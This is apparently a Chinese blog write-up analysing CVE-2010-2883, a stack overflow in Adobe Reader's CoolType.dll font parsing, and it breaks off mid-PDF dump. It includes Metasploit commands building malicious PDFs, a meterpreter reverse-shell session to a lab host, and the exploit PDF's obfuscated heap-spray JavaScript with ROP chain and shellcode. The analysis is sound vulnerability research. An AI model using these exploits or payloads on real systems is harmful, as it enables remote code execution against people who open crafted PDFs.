      <content type="html"><![CDATA[<blockquote><p>1、这个漏洞是《漏洞战争》中的例子，也要学着去分析分析实际的漏洞了。<br>2、CVE-2010-2883是Adobe Reader和Acrobat中的CoolType.dll库在解析字体文件SING表中的uniqueName项时存在的栈溢出漏洞。<br>3、用户受骗打开了特制的PDF文件就有可能导致执行任意代码。</p><ul><li>更新：2020.10.6,也算是重新分析了一遍吧,又收获了很多。这次分析,主要修正了第一次分析中的错误和不足。文章结构有较大变化。更新了动态调试部分，漏洞利用触发的具体原因，以及漏洞利用的具体细节。</li></ul><a id="more"></a></blockquote><h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>&emsp;&emsp;<strong><code>Adobe Reader</code></strong>和<strong><code>Acrobat</code></strong>都是美国奥多比（Adobe）公司的产品。Adobe Reader是一款免费的<code>PDF文件阅读器</code>，Acrobat是一款<code>PDF文件编辑和转换工具</code>。基于<strong><code>Window</code></strong>和<strong><code>Mac OS X</code></strong>的Adobe Reader和Acrobat <code>9.4之前</code>的9.x版本，<code>8.2.5之前</code>的8.x版本的<code>CoolType.dll</code>中存在<code>基于栈的缓冲区溢出漏洞</code>。远程攻击者可借助带有<code>TTF字体</code>Smart INdependent Glyphlets (<code>SING</code>)表格中超长字段<code>uniqueName</code>的PDF文件<code>执行任意代码</code>或者导致<code>拒绝服务</code>（应用程序崩溃）。</p><h2 id="0x10-分析环境"><a href="#0x10-分析环境" class="headerlink" title="0x10 分析环境"></a>0x10 分析环境</h2><table><thead><tr><th style="text-align:center"></th><th style="text-align:left">使用的环境</th><th style="text-align:left">备注</th></tr></thead><tbody><tr><td style="text-align:center">操作系统</td><td style="text-align:left">Windows XP Professional SP3</td><td style="text-align:left">简体中文版</td></tr><tr><td style="text-align:center">虚拟机</td><td style="text-align:left">VMware Workstation Pro</td><td style="text-align:left">版本号:12.5.8</td></tr><tr><td style="text-align:center">调试器</td><td style="text-align:left">OllyDbg</td><td style="text-align:left">吾爱破解OllyDbg</td></tr><tr><td style="text-align:center">反汇编器</td><td style="text-align:left">IDA Pro</td><td style="text-align:left">版本号:7.0</td></tr><tr><td style="text-align:center">漏洞软件</td><td style="text-align:left">Adobe Reader</td><td style="text-align:left">版本号:9.3.4</td></tr></tbody></table><h2 id="0x20-漏洞复现"><a href="#0x20-漏洞复现" class="headerlink" title="0x20 漏洞复现"></a>0x20 漏洞复现</h2><p>这里用<code>msf</code>来生成用于漏洞利用的<code>exploit样本</code>文件。</p><h3 id="0x21-生成exploit样本文件"><a href="#0x21-生成exploit样本文件" class="headerlink" title="0x21 生成exploit样本文件"></a>0x21 生成exploit样本文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">1、弹出计算器</span><br><span class="line">msf &gt; search cve-2010-2883</span><br><span class="line">msf &gt; use exploit/windows/fileformat/adobe_cooltype_sing</span><br><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; <span class="built_in">set</span> FILENAME CVE-2010-2883(calc).pdf</span><br><span class="line">FILENAME =&gt; CVE-2010-2883(calc).pdf</span><br><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; <span class="built_in">set</span> payload windows/<span class="built_in">exec</span> </span><br><span class="line">payload =&gt; windows/<span class="built_in">exec</span></span><br><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; <span class="built_in">set</span> CMD calc.exe</span><br><span class="line">CMD =&gt; calc.exe</span><br><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; run</span><br><span class="line">[*] Creating <span class="string">'CVE-2010-2883(calc).pdf'</span> file...</span><br><span class="line">[+] CVE-2010-2883(calc).pdf stored at /root/.msf4/<span class="built_in">local</span>/CVE-2010-2883(calc).pdf</span><br><span class="line"></span><br><span class="line">2、反弹Shell</span><br><span class="line">msf &gt; search cve-2010-2883</span><br><span class="line">msf &gt; use exploit/windows/fileformat/adobe_cooltype_sing</span><br><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; <span class="built_in">set</span> FILENAME CVE-2010-2883(shell).pdf</span><br><span class="line">FILENAME =&gt; CVE-2010-2883.pdf</span><br><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; <span class="built_in">set</span> LHOST 192.168.50.131</span><br><span class="line">LHOST =&gt; 192.168.50.131</span><br><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; <span class="built_in">set</span> LPORT 4444</span><br><span class="line">LPORT =&gt; 4444</span><br><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; run</span><br><span class="line">[*] Creating <span class="string">'CVE-2010-2883(shell).pdf'</span> file...</span><br><span class="line">[+] CVE-2010-2883(shell).pdf stored at /root/.msf4/<span class="built_in">local</span>/CVE-2010-2883(shell).pdf</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;执行完上面的命令可以在<code>/root/.msf4/local/</code>下找到用于exploit的样本文件。然后将样本文件复制到目标主机中。再在<code>kali</code>下进行监听，在windows XP SP3下通过Adobe Reader打开CVE-2010-2883(shell).pdf,获得<code>meterpreter session</code>,从而获得shell。</p><h3 id="0x22-反弹shell"><a href="#0x22-反弹shell" class="headerlink" title="0x22 反弹shell"></a>0x22 反弹shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/fileformat/adobe_cooltype_sing) &gt; back</span><br><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> LHOST 192.168.50.131</span><br><span class="line">LHOST =&gt; 192.168.50.131</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> LPORT 4444</span><br><span class="line">LPORT =&gt; 4444</span><br><span class="line">msf exploit(multi/handler) &gt; run</span><br><span class="line">[*] Started reverse TCP handler on 192.168.50.131:4444 </span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.50.130</span><br><span class="line">[*] Meterpreter session 7 opened (192.168.50.131:4444 -&gt; 192.168.50.130:1074) at 2018-09-17 16:42:44 +0800</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3156 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows XP [版本 5.1.2600]</span><br><span class="line">(C) 版权所有 1985-2001 Microsoft Corp.</span><br><span class="line"></span><br><span class="line">C:\Documents and Settings\*******\桌面&gt;</span><br></pre></td></tr></table></figure><h2 id="0x30-漏洞原理分析"><a href="#0x30-漏洞原理分析" class="headerlink" title="0x30 漏洞原理分析"></a>0x30 漏洞原理分析</h2><h3 id="0x31-PDF文件格式"><a href="#0x31-PDF文件格式" class="headerlink" title="0x31 PDF文件格式"></a>0x31 PDF文件格式</h3><p>&emsp;&emsp;<code>可移植文档格式</code>（Portable Document Format，简称PDF）是一种用独立于应用程序、硬件、操作系统的方式呈现文档的文件格式。1991年，Adobe Systems共同创始人<code>约翰·沃诺克</code>提出的名为<code>“Camelot”</code>的系统演变成<code>PDF</code>。PDF文件格式可以将文字、字型、格式、颜色及独立于设备和分辨率的图形图像等封装在一个文件中。该格式文件还可以包含超文本链接、声音和动态影像等电子信息，支持特长文件，集成度和安全可靠性都较高。而且这种格式是<code>跨平台</code>的，和操作系统无关。<br>&emsp;&emsp;PDF文档是一种<code>文本</code>和<code>二进制</code>混排的格式，它由以下<strong><code>四部分组成</code></strong>：</p><blockquote><ul><li><strong><code>header</code></strong>：头部，PDF文件的第一行，用以标识PDF文档的版本。通常格式为%PDF-x.y,PDF版本历经了1.0、1.1、1.2、1.3、1.4、1.5、1.6、1.7、2.0多个版本。</li><li><strong><code>body</code></strong>：PDF的主体部分，包含PDF文档的主题内容，各部分以对象的方式呈现。</li><li><strong><code>xref table</code></strong>：交叉引用表，通过交叉引用表可以快速的找到PDF文档中的各对象。每一个对象在交叉引用表中占据一项。</li><li><strong><code>trailer</code></strong>：PDF文档尾，包含交叉引用的摘要和交叉引用表的起始位置。</li></ul></blockquote><p>&emsp;&emsp;PDF文档中包含<code>字体对象</code>，而本篇文章所讲述的漏洞就是发生在PDF阅读器对于字体解析过程中，未对字体对象中所包含的<code>SING表</code>的<code>uniqueName字段</code>进行长度校验，导致了<code>栈溢出</code>漏洞的发生。下面是我通过<code>PdfStreamDumper</code>读出来的一些PDF的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line">%PDF-1.5    //此PDF文档符合PDF1.5规范</span><br><span class="line">%84 DA C7 95    </span><br><span class="line"></span><br><span class="line">1 0 obj     //对象1</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Pages 2 0 R        </span><br><span class="line">    /Type /Catalog      //此对象是catalog对象</span><br><span class="line">    /OpenAction 11 0 R  //对象11包含打开PDF时要执行的操作</span><br><span class="line">    /AcroForm 13 0 R</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">2 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /MediaBox 3 0 R     //对象3包含页面显示的大小</span><br><span class="line">    /Resources 4 0 R    //对象4包含该页所要包含的资源，包括字体和内容的类型</span><br><span class="line">    /Kids [5 0 R]       //此对象的孩子为对象5</span><br><span class="line">    /Count 1            //此PDF总共有1页</span><br><span class="line">    /Type /Pages        //此对象是Pages对象</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">3 0 obj</span><br><span class="line">    [0 0 595 842]</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">4 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Font 6 0 R         //对象6包含字体相关信息</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">5 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Parent 2 0 R       //此对象的父对象是2</span><br><span class="line">    /MediaBox 3 0 R     //对象3包含页面显示的大小</span><br><span class="line">    /Resources 4 0 R    //对象4包含该页所要包含的资源，包括字体和内容的类型</span><br><span class="line">    /Contents [8 0 R]   //对象8是内容对象</span><br><span class="line">    /Type /Page         //此对象的类型是Page</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">6 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /F1 7 0 R           //对象7包含字体相关信息</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">7 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Type /Font         //字体对象</span><br><span class="line">    /Subtype /TrueType  //字体类型是TrueType</span><br><span class="line">    /Name /F1</span><br><span class="line">    /BaseFont /Cinema   //基于Cinema字体</span><br><span class="line">    /Widths []</span><br><span class="line">    /FontDescriptor 9 0 R   //对象9是字体描述对象</span><br><span class="line">    /Encoding /MacRomanEncoding     //字符编码采用MacRoman</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">8 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Length 65</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">    0 g</span><br><span class="line">    BT</span><br><span class="line">    /F1 32 Tf</span><br><span class="line">    32 Tc</span><br><span class="line">    1 0 0 1 32 773.872 Tm</span><br><span class="line">    (Hello World!) Tj</span><br><span class="line">    ET</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">9 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Type /FontDescriptor            //此对象为字体描述对象</span><br><span class="line">    /FontName /Cinema                //字体名称是Cinema</span><br><span class="line">    /Flags 131140</span><br><span class="line">    /FontBBox [-177 -269 1123 866]</span><br><span class="line">    /FontFile2 10 0 R</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">10 0 obj    //字体文件</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Length 40238</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">    /Length1 65932</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">                            表目录头</span><br><span class="line">              |￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣￣|</span><br><span class="line">    00000000: 00 01 00 00 00 11 01 00 00 04 00 10 4F 53 2F 32  ............OS/2 --+</span><br><span class="line">    00000010: B4 5F F4 63 00 00 EB 70 00 00 00 56 50 43 4C 54  ._.c...p...VPCLT   |</span><br><span class="line">    00000020: D1 8A 5E 97 00 00 EB C8 00 00 00 36 63 6D 61 70  ..^........6cmap   |</span><br><span class="line">    00000030: A4 C3 E8 A0 00 00 B1 6C 00 00 03 58 63 76 74 20  .......l...Xcvt    |</span><br><span class="line">    00000040: FF D3 1D 39 00 00 1E FC 00 00 01 FC 66 70 67 6D  ...9........fpgm   |</span><br><span class="line">    00000050: E7 B4 F1 C4 00 00 26 60 00 00 00 8B 67 61 73 70  ......&amp;`....gasp   |</span><br><span class="line">    00000060: 00 07 00 07 00 01 01 48 00 00 00 0C 67 6C 79 66  .......H....glyf   |</span><br><span class="line">    00000070: 0C 74 41 CF 00 00 26 EC 00 00 8A 7E 68 64 6D 78  .tA...&amp;....~hdmx   |</span><br><span class="line">    00000080: 34 F0 21 0E 00 00 EC 00 00 00 15 48 68 65 61 64  4.!........Hhead   |TTF字体表目录项</span><br><span class="line">    00000090: DD 84 A2 D0 00 01 01 54 00 00 00 36 68 68 65 61  .......T...6hhea   |</span><br><span class="line">    000000a0: 10 45 08 6F 00 00 EB 4C 00 00 00 24 68 6D 74 78  .E.o...L...$hmtx   |</span><br><span class="line">    000000b0: 09 C6 8E B2 00 00 B4 C4 00 00 04 30 6B 65 72 6E  ...........0kern   |</span><br><span class="line">    000000c0: DC 52 D5 99 00 00 BD A0 00 00 2D 8A 6C 6F 63 61  .R........-.loca   |</span><br><span class="line">    000000d0: F3 CB D2 3D 00 00 BB 84 00 00 02 1A 6D 61 78 70  ...=........maxp   |</span><br><span class="line">    000000e0: 05 47 06 3A 00 00 EB 2C 00 00 00 20 53 49 4E 47  .G.:...,... SING   |&lt;-SING表，此漏洞相关的表</span><br><span class="line">    000000f0: D9 BC C8 B5 00 00 01 1C 00 00 1D DF 70 6F 73 74  ............post   |</span><br><span class="line">    00000100: B4 5A 2F BB 00 00 B8 F4 00 00 02 8E 70 72 65 70  .Z/.........prep --+</span><br><span class="line">    00000110: 3B 07 F1 00 00 00 20 F8 00 00 05 68 00 00 01 00  ;..... ....h.... --+</span><br><span class="line">    00000120: 01 0E 00 01 00 00 00 00 00 00 00 3A F1 B9 F1 F4  ...........:....   |</span><br><span class="line">    00000130: 75 62 82 1D 14 A7 82 4A 0C 0C 0C 0C AC 86 F7 B5  ub.....J........   |</span><br><span class="line">    00000140: ED 50 17 29 5C 12 8D 01 4E 51 05 0E E7 CC BC CA  .P.)\...NQ......   |</span><br><span class="line">    00000150: 6B 02 ED 81 13 36 AD 5E 45 85 DC 7D DB C2 4B 84  k....6.^E..&#125;..K.   |各个表内容</span><br><span class="line">    00000160: E8 67 8A 92 74 90 C8 3D 03 65 FE 80 4E E7 C7 42  .g..t..=.e..N..B   |</span><br><span class="line">    00000170: 89 8B DA 08 91 71 7A 3D 83 8E BD 60 AB 8F FA 53  .....qz=...`...S   |</span><br><span class="line">    ...........                                                                   |</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">11 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Type /Action</span><br><span class="line">    /S /JavaScript</span><br><span class="line">    /JS 12 0 R     //对象12为包含javascript脚本的对象</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">12 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Length 4245</span><br><span class="line">    /Filter [/FlateDecode /ASCIIHexDecode]</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">    var TwfyIgWVELWlTuFfZHxdRwABbEcFoBorpIEvEZgQvCEtkxULaIeYgnbjGLZ = unescape;</span><br><span class="line">    var NJOkySifYFYiNbSJhpbeOAhYFHGSUtytCzWyyxXppauWTHErAKprE = TwfyIgWVELWlTuFfZHxdRwABbEcFoBorpIEvEZgQvCEtkxULaIeYgnbjGLZ( &apos;%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%u6dba%u42a5%udd5e%ud9c4%u2474%u5df4%uc931%u31b1%uc583%u3104%u0f55%u5503%u4762%ua2b7%u0594%u5b38%u6a64%ubeb0%uaa55%ucba6%u1ac5%u9eac%ud1e9%u0ae0%u977a%u3c2c%u12cb%u730b%u0fcc%u126f%u524e%uf4bc%u9d6f%uf5b1%uc0a8%ua738%u8e61%u58ef%uda06%ud233%uca54%u0733%ued2c%u9612%ub427%u18b4%ucce4%u02fc%ue9e9%ub9b7%u86d9%u6849%u6610%u55e5%u959d%u92f7%u4619%uea82%ufb5a%u2895%u2721%uab13%uac81%u1783%u6030%ud355%ucd3e%ubb11%ud022%ub7f6%u595e%u17f9%u19d7%ub3de%ufabc%ue57f%uac18%uf580%u11c3%u7d25%u46e9%udc54%u9867%u5aea%u9ac5%u64f4%uf379%uefc5%u8416%u25d9%u7a53%u6490%u13f5%ufd7d%u7e44%u2b7e%u878a%udefd%u7c72%uab1d%u3877%u4799%u5105%u684c%u52ba%u0b45%uc15d%ue205%u61f8%ufaaf&apos; );</span><br><span class="line">    var cRwHmJYQNPwqpXQYBAIyEAVaOjCgxgtqtKEhMrzVXpnOrhEpTPPuUyqKHFAQWRTCgRetNDJBXYJVXIHnDyatbGu = TwfyIgWVELWlTuFfZHxdRwABbEcFoBorpIEvEZgQvCEtkxULaIeYgnbjGLZ( &quot;%&quot; + &quot;u&quot; + &quot;0&quot; + &quot;c&quot; + &quot;0&quot; + &quot;c&quot; + &quot;%u&quot; + &quot;0&quot; + &quot;c&quot; + &quot;0&quot; + &quot;c&quot; );</span><br><span class="line">    while (cRwHmJYQNPwqpXQYBAIyEAVaOjCgxgtqtKEhMrzVXpnOrhEpTPPuUyqKHFAQWRTCgRetNDJBXYJVXIHnDyatbGu.length + 20 + 8 &lt; 65536) cRwHmJYQNPwqpXQYBAIyEAVaOjCgxgtqtKEhMrzVXpnOrhEpTPPuUyqKHFAQWRTCgRetNDJBXYJVXIHnDyatbGu+=cRwHmJYQNPwqpXQYBAIyEAVaOjCgxgtqtKEhMrzVXpnOrhEpTPPuUyqKHFAQWRTCgRetNDJBXYJVXIHnDyatbGu;</span><br><span class="line">    KrNXjctxftIMNXOAmLBVtncBhahStOdstYlNAoHKZNJUMqRFirPqOGIYcUpmgRqqDAhsswI = cRwHmJYQNPwqpXQYBAIyEAVaOjCgxgtqtKEhMrzVXpnOrhEpTPPuUyqKHFAQWRTCgRetNDJBXYJVXIHnDyatbGu.substring(0, (0x0c0c-0x24)/2);</span><br><span class="line">    KrNXjctxftIMNXOAmLBVtncBhahStOdstYlNAoHKZNJUMqRFirPqOGIYcUpmgRqqDAhsswI += NJOkySifYFYiNbSJhpbeOAhYFHGSUtytCzWyyxXppauWTHErAKprE;</span><br><span class="line">    KrNXjctxftIMNXOAmLBVtncBhahStOdstYlNAoHKZNJUMqRFirPqOGIYcUpmgRqqDAhsswI += cRwHmJYQNPwqpXQYBAIyEAVaOjCgxgtqtKEhMrzVXpnOrhEpTPPuUyqKHFAQWRTCgRetNDJBXYJVXIHnDyatbGu;</span><br><span class="line">    LheMfJcDsiPjJxInbjSgRYenBRbNEUoJoyodfhVhrYEHdbIBxUtCnBsEijFXCBQsQfouhREgPzYzSyrYvcAWQQ = KrNXjctxftIMNXOAmLBVtncBhahStOdstYlNAoHKZNJUMqRFirPqOGIYcUpmgRqqDAhsswI.substring(0, 65536/2);</span><br><span class="line">    while(LheMfJcDsiPjJxInbjSgRYenBRbNEUoJoyodfhVhrYEHdbIBxUtCnBsEijFXCBQsQfouhREgPzYzSyrYvcAWQQ.length &lt; 0x80000) LheMfJcDsiPjJxInbjSgRYenBRbNEUoJoyodfhVhrYEHdbIBxUtCnBsEijFXCBQsQfouhREgPzYzSyrYvcAWQQ += LheMfJcDsiPjJxInbjSgRYenBRbNEUoJoyodfhVhrYEHdbIBxUtCnBsEijFXCBQsQfouhREgPzYzSyrYvcAWQQ;</span><br><span class="line">    uwZycdevcUFGuewXrcVZdhwBvRytYBJbBJSpNyatsyiSCIvl = LheMfJcDsiPjJxInbjSgRYenBRbNEUoJoyodfhVhrYEHdbIBxUtCnBsEijFXCBQsQfouhREgPzYzSyrYvcAWQQ.substring(0, 0x80000 - (0x1020-0x08) / 2);</span><br><span class="line">    var vOcAiZpBTekCUWuanxyjOsbZlqYVtRifJW = new Array();</span><br><span class="line">    for (BTqeWArJfacedmpaCNHYBpyzdROKuyNcvxBgIycbHdFSrzOZogvhokYUHsHAlmOTFHepivwTqE=0;BTqeWArJfacedmpaCNHYBpyzdROKuyNcvxBgIycbHdFSrzOZogvhokYUHsHAlmOTFHepivwTqE&lt;0x1f0;BTqeWArJfacedmpaCNHYBpyzdROKuyNcvxBgIycbHdFSrzOZogvhokYUHsHAlmOTFHepivwTqE++) vOcAiZpBTekCUWuanxyjOsbZlqYVtRifJW[BTqeWArJfacedmpaCNHYBpyzdROKuyNcvxBgIycbHdFSrzOZogvhokYUHsHAlmOTFHepivwTqE]=uwZycdevcUFGuewXrcVZdhwBvRytYBJbBJSpNyatsyiSCIvl+&quot;s&quot;;</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">13 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /XFA 14 0 R</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">14 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Length 372</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">    &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">    &lt;xdp:xdp xmlns:xdp=&quot;http://ns.adobe.com/xdp/&quot;&gt;</span><br><span class="line">    &lt;config xmlns=&quot;http://www.xfa.org/schema/xci/2.6/&quot;&gt;</span><br><span class="line">    &lt;present&gt;&lt;pdf&gt;&lt;interactive&gt;1&lt;/interactive&gt;&lt;/pdf&gt;&lt;/present&gt;</span><br><span class="line">    &lt;/config&gt;</span><br><span class="line">    &lt;template xmlns=&quot;http://www.xfa.org/schema/xfa-template/2.6/&quot;&gt;</span><br><span class="line">    &lt;subform name=&quot;form1&quot; layout=&quot;tb&quot; 